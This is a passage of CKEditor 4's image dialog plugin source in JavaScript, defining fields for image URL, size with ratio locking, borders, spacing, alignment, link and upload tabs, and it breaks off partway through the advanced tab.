﻿/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

(function() {
	var imageDialog = function( editor, dialogType ) {
			// Load image preview.
			var IMAGE = 1,
				LINK = 2,
				PREVIEW = 4,
				CLEANUP = 8,
				regexGetSize = /^\s*(\d+)((px)|\%)?\s*$/i,
				regexGetSizeOrEmpty = /(^\s*(\d+)((px)|\%)?\s*$)|^$/i,
				pxLengthRegex = /^\d+px$/;

			var onSizeChange = function() {
					var value = this.getValue(),
						// This = input element.
						dialog = this.getDialog(),
						aMatch = value.match( regexGetSize ); // Check value
					if ( aMatch ) {
						if ( aMatch[ 2 ] == '%' ) // % is allowed - > unlock ratio.
						switchLockRatio( dialog, false ); // Unlock.
						value = aMatch[ 1 ];
					}

					// Only if ratio is locked
					if ( dialog.lockRatio ) {
						var oImageOriginal = dialog.originalElement;
						if ( oImageOriginal.getCustomData( 'isReady' ) == 'true' ) {
							if ( this.id == 'txtHeight' ) {
								if ( value && value != '0' )
									value = Math.round( oImageOriginal.$.width * ( value / oImageOriginal.$.height ) );
								if ( !isNaN( value ) )
									dialog.setValueOf( 'info', 'txtWidth', value );
							} else //this.id = txtWidth.
							{
								if ( value && value != '0' )
									value = Math.round( oImageOriginal.$.height * ( value / oImageOriginal.$.width ) );
								if ( !isNaN( value ) )
									dialog.setValueOf( 'info', 'txtHeight', value );
							}
						}
					}
					updatePreview( dialog );
				};

			var updatePreview = function( dialog ) {
					//Don't load before onShow.
					if ( !dialog.originalElement || !dialog.preview )
						return 1;

					// Read attributes and update imagePreview;
					dialog.commitContent( PREVIEW, dialog.preview );
					return 0;
				};

			// Custom commit dialog logic, where we're intended to give inline style
			// field (txtdlgGenStyle) higher priority to avoid overwriting styles contribute
			// by other fields.
			function commitContent() {
				var args = arguments;
				var inlineStyleField = this.getContentElement( 'advanced', 'txtdlgGenStyle' );
				inlineStyleField && inlineStyleField.commit.apply( inlineStyleField, args );

				this.foreach( function( widget ) {
					if ( widget.commit && widget.id != 'txtdlgGenStyle' )
						widget.commit.apply( widget, args );
				});
			}

			// Avoid recursions.
			var incommit;

			// Synchronous field values to other impacted fields is required, e.g. border
			// size change should alter inline-style text as well.
			function commitInternally( targetFields ) {
				if ( incommit )
					return;

				incommit = 1;

				var dialog = this.getDialog(),
					element = dialog.imageElement;
				if ( element ) {
					// Commit this field and broadcast to target fields.
					this.commit( IMAGE, element );

					targetFields = [].concat( targetFields );
					var length = targetFields.length,
						field;
					for ( var i = 0; i < length; i++ ) {
						field = dialog.getContentElement.apply( dialog, targetFields[ i ].split( ':' ) );
						// May cause recursion.
						field && field.setup( IMAGE, element );
					}
				}

				incommit = 0;
			}

			var switchLockRatio = function( dialog, value ) {
					if ( !dialog.getContentElement( 'info', 'ratioLock' ) )
						return null;

					var oImageOriginal = dialog.originalElement;

					// Dialog may already closed. (#5505)
					if ( !oImageOriginal )
						return null;

					// Check image ratio and original image ratio, but respecting user's preference.
					if ( value == 'check' ) {
						if ( !dialog.userlockRatio && oImageOriginal.getCustomData( 'isReady' ) == 'true' ) {
							var width = dialog.getValueOf( 'info', 'txtWidth' ),
								height = dialog.getValueOf( 'info', 'txtHeight' ),
								originalRatio = oImageOriginal.$.width * 1000 / oImageOriginal.$.height,
								thisRatio = width * 1000 / height;
							dialog.lockRatio = false; // Default: unlock ratio

							if ( !width && !height )
								dialog.lockRatio = true;
							else if ( !isNaN( originalRatio ) && !isNaN( thisRatio ) ) {
								if ( Math.round( originalRatio ) == Math.round( thisRatio ) )
									dialog.lockRatio = true;
							}
						}
					} else if ( value != undefined )
						dialog.lockRatio = value;
					else {
						dialog.userlockRatio = 1;
						dialog.lockRatio = !dialog.lockRatio;
					}

					var ratioButton = CKEDITOR.document.getById( btnLockSizesId );
					if ( dialog.lockRatio )
						ratioButton.removeClass( 'cke_btn_unlocked' );
					else
						ratioButton.addClass( 'cke_btn_unlocked' );

					ratioButton.setAttribute( 'aria-checked', dialog.lockRatio );

					// Ratio button hc presentation - WHITE SQUARE / BLACK SQUARE
					if ( CKEDITOR.env.hc ) {
						var icon = ratioButton.getChild( 0 );
						icon.setHtml( dialog.lockRatio ? CKEDITOR.env.ie ? '\u25A0' : '\u25A3' : CKEDITOR.env.ie ? '\u25A1' : '\u25A2' );
					}

					return dialog.lockRatio;
				};

			var resetSize = function( dialog ) {
					var oImageOriginal = dialog.originalElement;
					if ( oImageOriginal.getCustomData( 'isReady' ) == 'true' ) {
						var widthField = dialog.getContentElement( 'info', 'txtWidth' ),
							heightField = dialog.getContentElement( 'info', 'txtHeight' );
						widthField && widthField.setValue( oImageOriginal.$.width );
						heightField && heightField.setValue( oImageOriginal.$.height );
					}
					updatePreview( dialog );
				};

			var setupDimension = function( type, element ) {
					if ( type != IMAGE )
						return;

					function checkDimension( size, defaultValue ) {
						var aMatch = size.match( regexGetSize );
						if ( aMatch ) {
							if ( aMatch[ 2 ] == '%' ) // % is allowed.
							{
								aMatch[ 1 ] += '%';
								switchLockRatio( dialog, false ); // Unlock ratio
							}
							return aMatch[ 1 ];
						}
						return defaultValue;
					}

					var dialog = this.getDialog(),
						value = '',
						dimension = this.id == 'txtWidth' ? 'width' : 'height',
						size = element.getAttribute( dimension );

					if ( size )
						value = checkDimension( size, value );
					value = checkDimension( element.getStyle( dimension ), value );

					this.setValue( value );
				};

			var previewPreloader;

			var onImgLoadEvent = function() {
					// Image is ready.
					var original = this.originalElement;
					original.setCustomData( 'isReady', 'true' );
					original.removeListener( 'load', onImgLoadEvent );
					original.removeListener( 'error', onImgLoadErrorEvent );
					original.removeListener( 'abort', onImgLoadErrorEvent );

					// Hide loader
					CKEDITOR.document.getById( imagePreviewLoaderId ).setStyle( 'display', 'none' );

					// New image -> new domensions
					if ( !this.dontResetSize )
						resetSize( this );

					if ( this.firstLoad )
						CKEDITOR.tools.setTimeout( function() {
						switchLockRatio( this, 'check' );
					}, 0, this );

					this.firstLoad = false;
					this.dontResetSize = false;
				};

			var onImgLoadErrorEvent = function() {
					// Error. Image is not loaded.
					var original = this.originalElement;
					original.removeListener( 'load', onImgLoadEvent );
					original.removeListener( 'error', onImgLoadErrorEvent );
					original.removeListener( 'abort', onImgLoadErrorEvent );

					// Set Error image.
					var noimage = CKEDITOR.getUrl( CKEDITOR.plugins.get( 'image' ).path + 'images/noimage.png' );

					if ( this.preview )
						this.preview.setAttribute( 'src', noimage );

					// Hide loader
					CKEDITOR.document.getById( imagePreviewLoaderId ).setStyle( 'display', 'none' );
					switchLockRatio( this, false ); // Unlock.
				};

			var numbering = function( id ) {
					return CKEDITOR.tools.getNextId() + '_' + id;
				},
				btnLockSizesId = numbering( 'btnLockSizes' ),
				btnResetSizeId = numbering( 'btnResetSize' ),
				imagePreviewLoaderId = numbering( 'ImagePreviewLoader' ),
				previewLinkId = numbering( 'previewLink' ),
				previewImageId = numbering( 'previewImage' );

			return {
				title: editor.lang.image[ dialogType == 'image' ? 'title' : 'titleButton' ],
				minWidth: 420,
				minHeight: 360,
				onShow: function() {
					this.imageElement = false;
					this.linkElement = false;

					// Default: create a new element.
					this.imageEditMode = false;
					this.linkEditMode = false;

					this.lockRatio = true;
					this.userlockRatio = 0;
					this.dontResetSize = false;
					this.firstLoad = true;
					this.addLink = false;

					var editor = this.getParentEditor(),
						sel = editor.getSelection(),
						element = sel && sel.getSelectedElement(),
						link = element && editor.elementPath( element ).contains( 'a', 1 );

					//Hide loader.
					CKEDITOR.document.getById( imagePreviewLoaderId ).setStyle( 'display', 'none' );
					// Create the preview before setup the dialog contents.
					previewPreloader = new CKEDITOR.dom.element( 'img', editor.document );
					this.preview = CKEDITOR.document.getById( previewImageId );

					// Copy of the image
					this.originalElement = editor.document.createElement( 'img' );
					this.originalElement.setAttribute( 'alt', '' );
					this.originalElement.setCustomData( 'isReady', 'false' );

					if ( link ) {
						this.linkElement = link;
						this.linkEditMode = true;

						// Look for Image element.
						var linkChildren = link.getChildren();
						if ( linkChildren.count() == 1 ) // 1 child.
						{
							var childTagName = linkChildren.getItem( 0 ).getName();
							if ( childTagName == 'img' || childTagName == 'input' ) {
								this.imageElement = linkChildren.getItem( 0 );
								if ( this.imageElement.getName() == 'img' )
									this.imageEditMode = 'img';
								else if ( this.imageElement.getName() == 'input' )
									this.imageEditMode = 'input';
							}
						}
						// Fill out all fields.
						if ( dialogType == 'image' )
							this.setupContent( LINK, link );
					}

					if ( element && element.getName() == 'img' && !element.data( 'cke-realelement' ) || element && element.getName() == 'input' && element.getAttribute( 'type' ) == 'image' ) {
						this.imageEditMode = element.getName();
						this.imageElement = element;
					}

					if ( this.imageEditMode ) {
						// Use the original element as a buffer from  since we don't want
						// temporary changes to be committed, e.g. if the dialog is canceled.
						this.cleanImageElement = this.imageElement;
						this.imageElement = this.cleanImageElement.clone( true, true );

						// Fill out all fields.
						this.setupContent( IMAGE, this.imageElement );
					} else
						this.imageElement = editor.document.createElement( 'img' );

					// Refresh LockRatio button
					switchLockRatio( this, true );

					// Dont show preview if no URL given.
					if ( !CKEDITOR.tools.trim( this.getValueOf( 'info', 'txtUrl' ) ) ) {
						this.preview.removeAttribute( 'src' );
						this.preview.setStyle( 'display', 'none' );
					}
				},
				onOk: function() {
					// Edit existing Image.
					if ( this.imageEditMode ) {
						var imgTagName = this.imageEditMode;

						// Image dialog and Input element.
						if ( dialogType == 'image' && imgTagName == 'input' && confirm( editor.lang.image.button2Img ) ) {
							// Replace INPUT-> IMG
							imgTagName = 'img';
							this.imageElement = editor.document.createElement( 'img' );
							this.imageElement.setAttribute( 'alt', '' );
							editor.insertElement( this.imageElement );
						}
						// ImageButton dialog and Image element.
						else if ( dialogType != 'image' && imgTagName == 'img' && confirm( editor.lang.image.img2Button ) ) {
							// Replace IMG -> INPUT
							imgTagName = 'input';
							this.imageElement = editor.document.createElement( 'input' );
							this.imageElement.setAttributes({
								type: 'image',
								alt: ''
							});
							editor.insertElement( this.imageElement );
						} else {
							// Restore the original element before all commits.
							this.imageElement = this.cleanImageElement;
							delete this.cleanImageElement;
						}
					} else // Create a new image.
					{
						// Image dialog -> create IMG element.
						if ( dialogType == 'image' )
							this.imageElement = editor.document.createElement( 'img' );
						else {
							this.imageElement = editor.document.createElement( 'input' );
							this.imageElement.setAttribute( 'type', 'image' );
						}
						this.imageElement.setAttribute( 'alt', '' );
					}

					// Create a new link.
					if ( !this.linkEditMode )
						this.linkElement = editor.document.createElement( 'a' );

					// Set attributes.
					this.commitContent( IMAGE, this.imageElement );
					this.commitContent( LINK, this.linkElement );

					// Remove empty style attribute.
					if ( !this.imageElement.getAttribute( 'style' ) )
						this.imageElement.removeAttribute( 'style' );

					// Insert a new Image.
					if ( !this.imageEditMode ) {
						if ( this.addLink ) {
							//Insert a new Link.
							if ( !this.linkEditMode ) {
								editor.insertElement( this.linkElement );
								this.linkElement.append( this.imageElement, false );
							} else //Link already exists, image not.
							editor.insertElement( this.imageElement );
						} else
							editor.insertElement( this.imageElement );
					} else // Image already exists.
					{
						//Add a new link element.
						if ( !this.linkEditMode && this.addLink ) {
							editor.insertElement( this.linkElement );
							this.imageElement.appendTo( this.linkElement );
						}
						//Remove Link, Image exists.
						else if ( this.linkEditMode && !this.addLink ) {
							editor.getSelection().selectElement( this.linkElement );
							editor.insertElement( this.imageElement );
						}
					}
				},
				onLoad: function() {
					if ( dialogType != 'image' )
						this.hidePage( 'Link' ); //Hide Link tab.
					var doc = this._.element.getDocument();

					if ( this.getContentElement( 'info', 'ratioLock' ) ) {
						this.addFocusable( doc.getById( btnResetSizeId ), 5 );
						this.addFocusable( doc.getById( btnLockSizesId ), 5 );
					}

					this.commitContent = commitContent;
				},
				onHide: function() {
					if ( this.preview )
						this.commitContent( CLEANUP, this.preview );

					if ( this.originalElement ) {
						this.originalElement.removeListener( 'load', onImgLoadEvent );
						this.originalElement.removeListener( 'error', onImgLoadErrorEvent );
						this.originalElement.removeListener( 'abort', onImgLoadErrorEvent );
						this.originalElement.remove();
						this.originalElement = false; // Dialog is closed.
					}

					delete this.imageElement;
				},
				contents: [
					{
					id: 'info',
					label: editor.lang.image.infoTab,
					accessKey: 'I',
					elements: [
						{
						type: 'vbox',
						padding: 0,
						children: [
							{
							type: 'hbox',
							widths: [ '280px', '110px' ],
							align: 'right',
							children: [
								{
								id: 'txtUrl',
								type: 'text',
								label: editor.lang.common.url,
								required: true,
								onChange: function() {
									var dialog = this.getDialog(),
										newUrl = this.getValue();

									//Update original image
									if ( newUrl.length > 0 ) //Prevent from load before onShow
									{
										dialog = this.getDialog();
										var original = dialog.originalElement;

										dialog.preview.removeStyle( 'display' );

										original.setCustomData( 'isReady', 'false' );
										// Show loader
										var loader = CKEDITOR.document.getById( imagePreviewLoaderId );
										if ( loader )
											loader.setStyle( 'display', '' );

										original.on( 'load', onImgLoadEvent, dialog );
										original.on( 'error', onImgLoadErrorEvent, dialog );
										original.on( 'abort', onImgLoadErrorEvent, dialog );
										original.setAttribute( 'src', newUrl );

										// Query the preloader to figure out the url impacted by based href.
										previewPreloader.setAttribute( 'src', newUrl );
										dialog.preview.setAttribute( 'src', previewPreloader.$.src );
										updatePreview( dialog );
									}
									// Dont show preview if no URL given.
									else if ( dialog.preview ) {
										dialog.preview.removeAttribute( 'src' );
										dialog.preview.setStyle( 'display', 'none' );
									}
								},
								setup: function( type, element ) {
									if ( type == IMAGE ) {
										var url = element.data( 'cke-saved-src' ) || element.getAttribute( 'src' );
										var field = this;

										this.getDialog().dontResetSize = true;

										field.setValue( url ); // And call this.onChange()
										// Manually set the initial value.(#4191)
										field.setInitValue();
									}
								},
								commit: function( type, element ) {
									if ( type == IMAGE && ( this.getValue() || this.isChanged() ) ) {
										element.data( 'cke-saved-src', this.getValue() );
										element.setAttribute( 'src', this.getValue() );
									} else if ( type == CLEANUP ) {
										element.setAttribute( 'src', '' ); // If removeAttribute doesn't work.
										element.removeAttribute( 'src' );
									}
								},
								validate: CKEDITOR.dialog.validate.notEmpty( editor.lang.image.urlMissing )
							},
								{
								type: 'button',
								id: 'browse',
								// v-align with the 'txtUrl' field.
								// TODO: We need something better than a fixed size here.
								style: 'display:inline-block;margin-top:10px;',
								align: 'center',
								label: editor.lang.common.browseServer,
								hidden: true,
								filebrowser: 'info:txtUrl'
							}
							]
						}
						]
					},
						{
						id: 'txtAlt',
						type: 'text',
						label: editor.lang.image.alt,
						accessKey: 'T',
						'default': '',
						onChange: function() {
							updatePreview( this.getDialog() );
						},
						setup: function( type, element ) {
							if ( type == IMAGE )
								this.setValue( element.getAttribute( 'alt' ) );
						},
						commit: function( type, element ) {
							if ( type == IMAGE ) {
								if ( this.getValue() || this.isChanged() )
									element.setAttribute( 'alt', this.getValue() );
							} else if ( type == PREVIEW ) {
								element.setAttribute( 'alt', this.getValue() );
							} else if ( type == CLEANUP ) {
								element.removeAttribute( 'alt' );
							}
						}
					},
						{
						type: 'hbox',
						children: [
							{
							id: 'basic',
							type: 'vbox',
							children: [
								{
								type: 'hbox',
								requiredContent: 'img{width,height}',
								widths: [ '50%', '50%' ],
								children: [
									{
									type: 'vbox',
									padding: 1,
									children: [
										{
										type: 'text',
										width: '45px',
										id: 'txtWidth',
										label: editor.lang.common.width,
										onKeyUp: onSizeChange,
										onChange: function() {
											commitInternally.call( this, 'advanced:txtdlgGenStyle' );
										},
										validate: function() {
											var aMatch = this.getValue().match( regexGetSizeOrEmpty ),
												isValid = !!( aMatch && parseInt( aMatch[ 1 ], 10 ) !== 0 );
											if ( !isValid )
												alert( editor.lang.common.invalidWidth );
											return isValid;
										},
										setup: setupDimension,
										commit: function( type, element, internalCommit ) {
											var value = this.getValue();
											if ( type == IMAGE ) {
												if ( value )
													element.setStyle( 'width', CKEDITOR.tools.cssLength( value ) );
												else
													element.removeStyle( 'width' );

												!internalCommit && element.removeAttribute( 'width' );
											} else if ( type == PREVIEW ) {
												var aMatch = value.match( regexGetSize );
												if ( !aMatch ) {
													var oImageOriginal = this.getDialog().originalElement;
													if ( oImageOriginal.getCustomData( 'isReady' ) == 'true' )
														element.setStyle( 'width', oImageOriginal.$.width + 'px' );
												} else
													element.setStyle( 'width', CKEDITOR.tools.cssLength( value ) );
											} else if ( type == CLEANUP ) {
												element.removeAttribute( 'width' );
												element.removeStyle( 'width' );
											}
										}
									},
										{
										type: 'text',
										id: 'txtHeight',
										width: '45px',
										label: editor.lang.common.height,
										onKeyUp: onSizeChange,
										onChange: function() {
											commitInternally.call( this, 'advanced:txtdlgGenStyle' );
										},
										validate: function() {
											var aMatch = this.getValue().match( regexGetSizeOrEmpty ),
												isValid = !!( aMatch && parseInt( aMatch[ 1 ], 10 ) !== 0 );
											if ( !isValid )
												alert( editor.lang.common.invalidHeight );
											return isValid;
										},
										setup: setupDimension,
										commit: function( type, element, internalCommit ) {
											var value = this.getValue();
											if ( type == IMAGE ) {
												if ( value )
													element.setStyle( 'height', CKEDITOR.tools.cssLength( value ) );
												else
													element.removeStyle( 'height' );

												!internalCommit && element.removeAttribute( 'height' );
											} else if ( type == PREVIEW ) {
												var aMatch = value.match( regexGetSize );
												if ( !aMatch ) {
													var oImageOriginal = this.getDialog().originalElement;
													if ( oImageOriginal.getCustomData( 'isReady' ) == 'true' )
														element.setStyle( 'height', oImageOriginal.$.height + 'px' );
												} else
													element.setStyle( 'height', CKEDITOR.tools.cssLength( value ) );
											} else if ( type == CLEANUP ) {
												element.removeAttribute( 'height' );
												element.removeStyle( 'height' );
											}
										}
									}
									]
								},
									{
									id: 'ratioLock',
									type: 'html',
									style: 'margin-top:30px;width:40px;height:40px;',
									onLoad: function() {
										// Activate Reset button
										var resetButton = CKEDITOR.document.getById( btnResetSizeId ),
											ratioButton = CKEDITOR.document.getById( btnLockSizesId );
										if ( resetButton ) {
											resetButton.on( 'click', function( evt ) {
												resetSize( this );
												evt.data && evt.data.preventDefault();
											}, this.getDialog() );
											resetButton.on( 'mouseover', function() {
												this.addClass( 'cke_btn_over' );
											}, resetButton );
											resetButton.on( 'mouseout', function() {
												this.removeClass( 'cke_btn_over' );
											}, resetButton );
										}
										// Activate (Un)LockRatio button
										if ( ratioButton ) {
											ratioButton.on( 'click', function( evt ) {
												var locked = switchLockRatio( this ),
													oImageOriginal = this.originalElement,
													width = this.getValueOf( 'info', 'txtWidth' );

												if ( oImageOriginal.getCustomData( 'isReady' ) == 'true' && width ) {
													var height = oImageOriginal.$.height / oImageOriginal.$.width * width;
													if ( !isNaN( height ) ) {
														this.setValueOf( 'info', 'txtHeight', Math.round( height ) );
														updatePreview( this );
													}
												}
												evt.data && evt.data.preventDefault();
											}, this.getDialog() );
											ratioButton.on( 'mouseover', function() {
												this.addClass( 'cke_btn_over' );
											}, ratioButton );
											ratioButton.on( 'mouseout', function() {
												this.removeClass( 'cke_btn_over' );
											}, ratioButton );
										}
									},
									html: '<div>' +
										'<a href="javascript:void(0)" tabindex="-1" title="' + editor.lang.image.lockRatio +
										'" class="cke_btn_locked" id="' + btnLockSizesId + '" role="checkbox"><span class="cke_icon"></span><span class="cke_label">' + editor.lang.image.lockRatio + '</span></a>' +
										'<a href="javascript:void(0)" tabindex="-1" title="' + editor.lang.image.resetSize +
										'" class="cke_btn_reset" id="' + btnResetSizeId + '" role="button"><span class="cke_label">' + editor.lang.image.resetSize + '</span></a>' +
										'</div>'
								}
								]
							},
								{
								type: 'vbox',
								padding: 1,
								children: [
									{
									type: 'text',
									id: 'txtBorder',
									requiredContent: 'img{border-width}',
									width: '60px',
									label: editor.lang.image.border,
									'default': '',
									onKeyUp: function() {
										updatePreview( this.getDialog() );
									},
									onChange: function() {
										commitInternally.call( this, 'advanced:txtdlgGenStyle' );
									},
									validate: CKEDITOR.dialog.validate.integer( editor.lang.image.validateBorder ),
									setup: function( type, element ) {
										if ( type == IMAGE ) {
											var value,
												borderStyle = element.getStyle( 'border-width' );
											borderStyle = borderStyle && borderStyle.match( /^(\d+px)(?: \1 \1 \1)?$/ );
											value = borderStyle && parseInt( borderStyle[ 1 ], 10 );
											isNaN( parseInt( value, 10 ) ) && ( value = element.getAttribute( 'border' ) );
											this.setValue( value );
										}
									},
									commit: function( type, element, internalCommit ) {
										var value = parseInt( this.getValue(), 10 );
										if ( type == IMAGE || type == PREVIEW ) {
											if ( !isNaN( value ) ) {
												element.setStyle( 'border-width', CKEDITOR.tools.cssLength( value ) );
												element.setStyle( 'border-style', 'solid' );
											} else if ( !value && this.isChanged() )
												element.removeStyle( 'border' );

											if ( !internalCommit && type == IMAGE )
												element.removeAttribute( 'border' );
										} else if ( type == CLEANUP ) {
											element.removeAttribute( 'border' );
											element.removeStyle( 'border-width' );
											element.removeStyle( 'border-style' );
											element.removeStyle( 'border-color' );
										}
									}
								},
									{
									type: 'text',
									id: 'txtHSpace',
									requiredContent: 'img{margin-left,margin-right}',
									width: '60px',
									label: editor.lang.image.hSpace,
									'default': '',
									onKeyUp: function() {
										updatePreview( this.getDialog() );
									},
									onChange: function() {
										commitInternally.call( this, 'advanced:txtdlgGenStyle' );
									},
									validate: CKEDITOR.dialog.validate.integer( editor.lang.image.validateHSpace ),
									setup: function( type, element ) {
										if ( type == IMAGE ) {
											var value, marginLeftPx, marginRightPx,
												marginLeftStyle = element.getStyle( 'margin-left' ),
												marginRightStyle = element.getStyle( 'margin-right' );

											marginLeftStyle = marginLeftStyle && marginLeftStyle.match( pxLengthRegex );
											marginRightStyle = marginRightStyle && marginRightStyle.match( pxLengthRegex );
											marginLeftPx = parseInt( marginLeftStyle, 10 );
											marginRightPx = parseInt( marginRightStyle, 10 );

											value = ( marginLeftPx == marginRightPx ) && marginLeftPx;
											isNaN( parseInt( value, 10 ) ) && ( value = element.getAttribute( 'hspace' ) );

											this.setValue( value );
										}
									},
									commit: function( type, element, internalCommit ) {
										var value = parseInt( this.getValue(), 10 );
										if ( type == IMAGE || type == PREVIEW ) {
											if ( !isNaN( value ) ) {
												element.setStyle( 'margin-left', CKEDITOR.tools.cssLength( value ) );
												element.setStyle( 'margin-right', CKEDITOR.tools.cssLength( value ) );
											} else if ( !value && this.isChanged() ) {
												element.removeStyle( 'margin-left' );
												element.removeStyle( 'margin-right' );
											}

											if ( !internalCommit && type == IMAGE )
												element.removeAttribute( 'hspace' );
										} else if ( type == CLEANUP ) {
											element.removeAttribute( 'hspace' );
											element.removeStyle( 'margin-left' );
											element.removeStyle( 'margin-right' );
										}
									}
								},
									{
									type: 'text',
									id: 'txtVSpace',
									requiredContent: 'img{margin-top,margin-bottom}',
									width: '60px',
									label: editor.lang.image.vSpace,
									'default': '',
									onKeyUp: function() {
										updatePreview( this.getDialog() );
									},
									onChange: function() {
										commitInternally.call( this, 'advanced:txtdlgGenStyle' );
									},
									validate: CKEDITOR.dialog.validate.integer( editor.lang.image.validateVSpace ),
									setup: function( type, element ) {
										if ( type == IMAGE ) {
											var value, marginTopPx, marginBottomPx,
												marginTopStyle = element.getStyle( 'margin-top' ),
												marginBottomStyle = element.getStyle( 'margin-bottom' );

											marginTopStyle = marginTopStyle && marginTopStyle.match( pxLengthRegex );
											marginBottomStyle = marginBottomStyle && marginBottomStyle.match( pxLengthRegex );
											marginTopPx = parseInt( marginTopStyle, 10 );
											marginBottomPx = parseInt( marginBottomStyle, 10 );

											value = ( marginTopPx == marginBottomPx ) && marginTopPx;
											isNaN( parseInt( value, 10 ) ) && ( value = element.getAttribute( 'vspace' ) );
											this.setValue( value );
										}
									},
									commit: function( type, element, internalCommit ) {
										var value = parseInt( this.getValue(), 10 );
										if ( type == IMAGE || type == PREVIEW ) {
											if ( !isNaN( value ) ) {
												element.setStyle( 'margin-top', CKEDITOR.tools.cssLength( value ) );
												element.setStyle( 'margin-bottom', CKEDITOR.tools.cssLength( value ) );
											} else if ( !value && this.isChanged() ) {
												element.removeStyle( 'margin-top' );
												element.removeStyle( 'margin-bottom' );
											}

											if ( !internalCommit && type == IMAGE )
												element.removeAttribute( 'vspace' );
										} else if ( type == CLEANUP ) {
											element.removeAttribute( 'vspace' );
											element.removeStyle( 'margin-top' );
											element.removeStyle( 'margin-bottom' );
										}
									}
								},
									{
									id: 'cmbAlign',
									requiredContent: 'img{float}',
									type: 'select',
									widths: [ '35%', '65%' ],
									style: 'width:90px',
									label: editor.lang.common.align,
									'default': '',
									items: [
										[ editor.lang.common.notSet, '' ],
										[ editor.lang.common.alignLeft, 'left' ],
										[ editor.lang.common.alignRight, 'right' ]
										// Backward compatible with v2 on setup when specified as attribute value,
										// while these values are no more available as select options.
										//	[ editor.lang.image.alignAbsBottom , 'absBottom'],
										//	[ editor.lang.image.alignAbsMiddle , 'absMiddle'],
										//  [ editor.lang.image.alignBaseline , 'baseline'],
										//  [ editor.lang.image.alignTextTop , 'text-top'],
										//  [ editor.lang.image.alignBottom , 'bottom'],
										//  [ editor.lang.image.alignMiddle , 'middle'],
										//  [ editor.lang.image.alignTop , 'top']
									],
									onChange: function() {
										updatePreview( this.getDialog() );
										commitInternally.call( this, 'advanced:txtdlgGenStyle' );
									},
									setup: function( type, element ) {
										if ( type == IMAGE ) {
											var value = element.getStyle( 'float' );
											switch ( value ) {
												// Ignore those unrelated values.
												case 'inherit':
												case 'none':
													value = '';
											}

											!value && ( value = ( element.getAttribute( 'align' ) || '' ).toLowerCase() );
											this.setValue( value );
										}
									},
									commit: function( type, element, internalCommit ) {
										var value = this.getValue();
										if ( type == IMAGE || type == PREVIEW ) {
											if ( value )
												element.setStyle( 'float', value );
											else
												element.removeStyle( 'float' );

											if ( !internalCommit && type == IMAGE ) {
												value = ( element.getAttribute( 'align' ) || '' ).toLowerCase();
												switch ( value ) {
													// we should remove it only if it matches "left" or "right",
													// otherwise leave it intact.
													case 'left':
													case 'right':
														element.removeAttribute( 'align' );
												}
											}
										} else if ( type == CLEANUP )
											element.removeStyle( 'float' );

									}
								}
								]
							}
							]
						},
							{
							type: 'vbox',
							height: '250px',
							children: [
								{
								type: 'html',
								id: 'htmlPreview',
								style: 'width:95%;',
								html: '<div>' + CKEDITOR.tools.htmlEncode( editor.lang.common.preview ) + '<br>' +
									'<div id="' + imagePreviewLoaderId + '" class="ImagePreviewLoader" style="display:none"><div class="loading">&nbsp;</div></div>' +
									'<div class="ImagePreviewBox"><table><tr><td>' +
										'<a href="javascript:void(0)" target="_blank" onclick="return false;" id="' + previewLinkId + '">' +
										'<img id="' + previewImageId + '" alt="" /></a>' +
										( editor.config.image_previewText || 'Lorem ipsum dolor sit amet, consectetuer adipiscing elit. ' +
											'Maecenas feugiat consequat diam. Maecenas metus. Vivamus diam purus, cursus a, commodo non, facilisis vitae, ' +
											'nulla. Aenean dictum lacinia tortor. Nunc iaculis, nibh non iaculis aliquam, orci felis euismod neque, sed ornare massa mauris sed velit. Nulla pretium mi et risus. Fusce mi pede, tempor id, cursus ac, ullamcorper nec, enim. Sed tortor. Curabitur molestie. Duis velit augue, condimentum at, ultrices a, luctus ut, orci. Donec pellentesque egestas eros. Integer cursus, augue in cursus faucibus, eros pede bibendum sem, in tempus tellus justo quis ligula. Etiam eget tortor. Vestibulum rutrum, est ut placerat elementum, lectus nisl aliquam velit, tempor aliquam eros nunc nonummy metus. In eros metus, gravida a, gravida sed, lobortis id, turpis. Ut ultrices, ipsum at venenatis fringilla, sem nulla lacinia tellus, eget aliquet turpis mauris non enim. Nam turpis. Suspendisse lacinia. Curabitur ac tortor ut ipsum egestas elementum. Nunc imperdiet gravida mauris.' ) +
									'</td></tr></table></div></div>'
								}
							]
						}
						]
					}
					]
				},
					{
					id: 'Link',
					requiredContent: 'a[href]',
					label: editor.lang.image.linkTab,
					padding: 0,
					elements: [
						{
						id: 'txtUrl',
						type: 'text',
						label: editor.lang.common.url,
						style: 'width: 100%',
						'default': '',
						setup: function( type, element ) {
							if ( type == LINK ) {
								var href = element.data( 'cke-saved-href' );
								if ( !href )
									href = element.getAttribute( 'href' );
								this.setValue( href );
							}
						},
						commit: function( type, element ) {
							if ( type == LINK ) {
								if ( this.getValue() || this.isChanged() ) {
									var url = decodeURI( this.getValue() );
									element.data( 'cke-saved-href', url );
									element.setAttribute( 'href', url );

									if ( this.getValue() || !editor.config.image_removeLinkByEmptyURL )
										this.getDialog().addLink = true;
								}
							}
						}
					},
						{
						type: 'button',
						id: 'browse',
						filebrowser: {
							action: 'Browse',
							target: 'Link:txtUrl',
							url: editor.config.filebrowserImageBrowseLinkUrl
						},
						style: 'float:right',
						hidden: true,
						label: editor.lang.common.browseServer
					},
						{
						id: 'cmbTarget',
						type: 'select',
						requiredContent: 'a[target]',
						label: editor.lang.common.target,
						'default': '',
						items: [
							[ editor.lang.common.notSet, '' ],
							[ editor.lang.common.targetNew, '_blank' ],
							[ editor.lang.common.targetTop, '_top' ],
							[ editor.lang.common.targetSelf, '_self' ],
							[ editor.lang.common.targetParent, '_parent' ]
							],
						setup: function( type, element ) {
							if ( type == LINK )
								this.setValue( element.getAttribute( 'target' ) || '' );
						},
						commit: function( type, element ) {
							if ( type == LINK ) {
								if ( this.getValue() || this.isChanged() )
									element.setAttribute( 'target', this.getValue() );
							}
						}
					}
					]
				},
					{
					id: 'Upload',
					hidden: true,
					filebrowser: 'uploadButton',
					label: editor.lang.image.upload,
					elements: [
						{
						type: 'file',
						id: 'upload',
						label: editor.lang.image.btnUpload,
						style: 'height:40px',
						size: 38
					},
						{
						type: 'fileButton',
						id: 'uploadButton',
						filebrowser: 'info:txtUrl',
						label: editor.lang.image.btnUpload,
						'for': [ 'Upload', 'upload' ]
					}
					]
				},
					{
					id: 'advanced',
					label: editor.lang.common.advancedTab,
					elements: [
						{
						type: 'hbox',
						widths: [ '50%', '25%', '25%' ],
						children: [
							{
							type: 'text',
							id: 'linkId',
							requiredContent: 'img[id]',
							label: editor.lang.common.id,
